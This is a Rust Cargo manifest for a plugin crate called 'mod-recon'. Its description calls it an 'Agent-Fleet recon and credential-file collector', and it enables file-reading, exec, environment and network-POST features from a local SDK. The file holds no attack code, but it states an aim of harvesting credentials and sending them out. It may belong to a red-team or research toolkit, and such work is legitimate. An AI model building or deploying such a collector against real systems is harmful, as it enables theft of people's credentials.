[package]
name = "mod-recon"
version = "0.1.0"
edition = "2021"
rust-version = "1.85"
license = "MIT OR Apache-2.0"
description = "Agent-Fleet recon and credential-file collector (ABI 2)"

[workspace]

[lib]
crate-type = ["cdylib"]

[dependencies]
modsdk = { path = "../../crates/modsdk", features = [
    "fs-read",
    "fs-dir",
    "fs-range",
    "spool",
    "exec",
    "net-post",
    "net",
    "env",
] }
serde_json = "1"

[profile.release]
opt-level = "z"
lto = true
panic = "abort"
strip = true
codegen-units = 1
